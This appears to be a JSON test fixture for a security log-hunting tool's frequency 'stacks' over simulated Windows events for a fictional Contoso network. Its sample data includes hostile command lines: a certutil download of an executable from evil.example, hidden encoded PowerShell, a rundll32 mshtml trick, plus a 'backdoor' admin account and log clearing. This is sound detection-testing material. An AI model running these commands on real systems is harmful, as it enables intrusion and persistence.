@@ -1,0 +1,596 @@
+{
+ "settings": {
+  "admin_accounts": [
+   "administrator",
+   "adm-*"
+  ],
+  "brands": [
+   "contoso"
+  ],
+  "businessHours": {
+   "end": 19,
+   "start": 8,
+   "tz": "Europe/Paris"
+  },
+  "expected_countries": [
+   "FR"
+  ],
+  "internal_domains": [
+   "contoso.com",
+   "interne.fr"
+  ],
+  "internal_ips": [
+   "10.0.0.0/8",
+   "192.168.0.0/16"
+  ],
+  "service_accounts": [
+   "svc_backup"
+  ],
+  "trusted_senders": [],
+  "vip_names": [
+   "lefevre marie",
+   "alice martin"
+  ],
+  "weekendDays": [
+   0,
+   6
+  ]
+ },
+ "stacks": [
+  {
+   "field": "image",
+   "filter": null,
+   "order": "rare",
+   "stack": {
+    "blank": 107,
+    "distinct": 4,
+    "events": 8,
+    "field": "image",
+    "hosts": 3,
+    "order": "rare",
+    "rows": [
+     {
+      "count": 1,
+      "first": null,
+      "hostList": [],
+      "hosts": 0,
+      "last": null,
+      "value": "C:\\Windows\\powershell.exe"
+     },
+     {
+      "count": 3,
+      "first": 1788255100000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255102000,
+      "value": "C:\\Windows\\System32\\rundll32.exe"
+     },
+     {
+      "count": 2,
+      "first": 1788255103000,
+      "hostList": [
+       "ws01",
+       "ws02"
+      ],
+      "hosts": 2,
+      "last": 1788255103000,
+      "value": "C:\\WINDOWS\\explorer.exe"
+     },
+     {
+      "count": 2,
+      "first": null,
+      "hostList": [
+       "ws02",
+       "ws03"
+      ],
+      "hosts": 2,
+      "last": null,
+      "value": "C:\\Windows\\System32\\svchost.exe"
+     }
+    ],
+    "truncated": false
+   }
+  },
+  {
+   "field": "commandLine",
+   "filter": null,
+   "order": "rare",
+   "stack": {
+    "blank": 110,
+    "distinct": 5,
+    "events": 5,
+    "field": "commandLine",
+    "hosts": 1,
+    "order": "rare",
+    "rows": [
+     {
+      "count": 1,
+      "first": null,
+      "hostList": [],
+      "hosts": 0,
+      "last": null,
+      "value": "powershell.exe -enc AAAA"
+     },
+     {
+      "count": 1,
+      "first": 1788255090000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255090000,
+      "value": "certutil.exe -urlcache -split -f http://evil.example/a.exe C:\\Users\\Public\\a.exe"
+     },
+     {
+      "count": 1,
+      "first": 1788255096000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255096000,
+      "value": "notepad.exe"
+     },
+     {
+      "count": 1,
+      "first": 1788255095000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255095000,
+      "value": "powershell -nop -w hidden -enc SQBFAFgA"
+     },
+     {
+      "count": 1,
+      "first": 1788255100000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255100000,
+      "value": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""
+     }
+    ],
+    "truncated": false
+   }
+  },
+  {
+   "field": "serviceName",
+   "filter": null,
+   "order": "common",
+   "stack": {
+    "blank": 112,
+    "distinct": 3,
+    "events": 3,
+    "field": "serviceName",
+    "hosts": 1,
+    "order": "common",
+    "rows": [
+     {
+      "count": 1,
+      "first": 1788255120000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255120000,
+      "value": "Updater"
+     },
+     {
+      "count": 1,
+      "first": null,
+      "hostList": [],
+      "hosts": 0,
+      "last": null,
+      "value": "Expected"
+     },
+     {
+      "count": 1,
+      "first": null,
+      "hostList": [],
+      "hosts": 0,
+      "last": null,
+      "value": "PSEXESVC"
+     }
+    ],
+    "truncated": false
+   }
+  },
+  {
+   "field": "targetUser",
+   "filter": null,
+   "order": "rare",
+   "stack": {
+    "blank": 34,
+    "distinct": 17,
+    "events": 81,
+    "field": "targetUser",
+    "hosts": 1,
+    "order": "rare",
+    "rows": [
+     {
+      "count": 1,
+      "first": 1788253800000,
+      "hostList": [],
+      "hosts": 0,
+      "last": 1788253800000,
+      "value": "user0@contoso.com"
+     },
+     {
+      "count": 1,
+      "first": 1788253830000,
+      "hostList": [],
+      "hosts": 0,
+      "last": 1788253830000,
+      "value": "user1@contoso.com"
+     },
+     {
+      "count": 1,
+      "first": 1788253860000,
+      "hostList": [],
+      "hosts": 0,
+      "last": 1788253860000,
+      "value": "user2@contoso.com"
+     },
+     {
+      "count": 1,
+      "first": 1788253890000,
+      "hostList": [],
+      "hosts": 0,
+      "last": 1788253890000,
+      "value": "user3@contoso.com"
+     },
+     {
+      "count": 1,
+      "first": 1788253920000,
+      "hostList": [],
+      "hosts": 0,
+      "last": 1788253920000,
+      "value": "user4@contoso.com"
+     },
+     {
+      "count": 1,
+      "first": 1788253950000,
+      "hostList": [],
+      "hosts": 0,
+      "last": 1788253950000,
+      "value": "user5@contoso.com"
+     },
+     {
+      "count": 1,
+      "first": 1788253980000,
+      "hostList": [],
+      "hosts": 0,
+      "last": 1788253980000,
+      "value": "user6@contoso.com"
+     },
+     {
+      "count": 1,
+      "first": 1788254010000,
+      "hostList": [],
+      "hosts": 0,
+      "last": 1788254010000,
+      "value": "user7@contoso.com"
+     },
+     {
+      "count": 1,
+      "first": 1788254040000,
+      "hostList": [],
+      "hosts": 0,
+      "last": 1788254040000,
+      "value": "user8@contoso.com"
+     },
+     {
+      "count": 6,
+      "first": 1788244800000,
+      "hostList": [],
+      "hosts": 0,
+      "last": 1788339600000,
+      "value": "bob@contoso.com"
+     },
+     {
+      "count": 48,
+      "first": 1788244200000,
+      "hostList": [],
+      "hosts": 0,
+      "last": 1788256800000,
+      "value": "alice@contoso.com"
+     },
+     {
+      "count": 1,
+      "first": 1788226200000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788226200000,
+      "value": "administrator"
+     },
+     {
+      "count": 1,
+      "first": 1788255131000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255131000,
+      "value": "Administrators"
+     },
+     {
+      "count": 1,
+      "first": 1788255130000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255130000,
+      "value": "backdoor"
+     },
+     {
+      "count": 1,
+      "first": 1788255102000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255102000,
+      "value": "CORP\\alice"
+     },
+     {
+      "count": 1,
+      "first": 1788080000000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788080000000,
+      "value": "svc_backup"
+     },
+     {
+      "count": 13,
+      "first": 1788255000000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255070000,
+      "value": "alice"
+     }
+    ],
+    "truncated": false
+   }
+  },
+  {
+   "field": "ipAddress",
+   "filter": {
+    "conditions": [
+     {
+      "field": "eventId",
+      "op": "in",
+      "value": [
+       4624,
+       4625
+      ]
+     }
+    ]
+   },
+   "order": "rare",
+   "stack": {
+    "blank": 0,
+    "distinct": 3,
+    "events": 15,
+    "field": "ipAddress",
+    "hosts": 1,
+    "order": "rare",
+    "rows": [
+     {
+      "count": 1,
+      "first": 1788080000000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788080000000,
+      "value": "10.0.0.5"
+     },
+     {
+      "count": 1,
+      "first": 1788226200000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788226200000,
+      "value": "198.51.100.7"
+     },
+     {
+      "count": 13,
+      "first": 1788255000000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255070000,
+      "value": "203.0.113.9"
+     }
+    ],
+    "truncated": false
+   }
+  },
+  {
+   "field": "providerEventId",
+   "filter": null,
+   "order": "rare",
+   "stack": {
+    "blank": 88,
+    "distinct": 12,
+    "events": 27,
+    "field": "providerEventId",
+    "hosts": 1,
+    "order": "rare",
+    "rows": [
+     {
+      "count": 1,
+      "first": 1788255110000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255110000,
+      "value": "Microsoft-Windows-Eventlog / 1102"
+     },
+     {
+      "count": 1,
+      "first": 1788255140000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255140000,
+      "value": "Microsoft-Windows-PowerShell / 4104"
+     },
+     {
+      "count": 1,
+      "first": 1788255130000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255130000,
+      "value": "Microsoft-Windows-Security-Auditing / 4720"
+     },
+     {
+      "count": 1,
+      "first": 1788255131000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255131000,
+      "value": "Microsoft-Windows-Security-Auditing / 4732"
+     },
+     {
+      "count": 1,
+      "first": 1788255100000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255100000,
+      "value": "Microsoft-Windows-Sysmon / 1"
+     },
+     {
+      "count": 1,
+      "first": 1788255103000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255103000,
+      "value": "Microsoft-Windows-Sysmon / 11"
+     },
+     {
+      "count": 1,
+      "first": 1788255102000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255102000,
+      "value": "Microsoft-Windows-Sysmon / 22"
+     },
+     {
+      "count": 1,
+      "first": 1788255101000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255101000,
+      "value": "Microsoft-Windows-Sysmon / 3"
+     },
+     {
+      "count": 1,
+      "first": 1788255120000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255120000,
+      "value": "Service Control Manager / 7045"
+     },
+     {
+      "count": 3,
+      "first": 1788080000000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255070000,
+      "value": "Microsoft-Windows-Security-Auditing / 4624"
+     },
+     {
+      "count": 3,
+      "first": 1788255090000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255096000,
+      "value": "Microsoft-Windows-Security-Auditing / 4688"
+     },
+     {
+      "count": 12,
+      "first": 1788255000000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255055000,
+      "value": "Microsoft-Windows-Security-Auditing / 4625"
+     }
+    ],
+    "truncated": false
+   }
+  },
+  {
+   "field": "processName",
+   "filter": {
+    "text": "powershell"
+   },
+   "order": "rare",
+   "stack": {
+    "blank": 3,
+    "distinct": 2,
+    "events": 2,
+    "field": "processName",
+    "hosts": 1,
+    "order": "rare",
+    "rows": [
+     {
+      "count": 1,
+      "first": 1788948000000,
+      "hostList": [],
+      "hosts": 0,
+      "last": 1788948000000,
+      "value": "POWERSHELL.EXE"
+     },
+     {
+      "count": 1,
+      "first": 1788255095000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255095000,
+      "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+     }
+    ],
+    "truncated": false
+   }
+  }
+ ]
+}
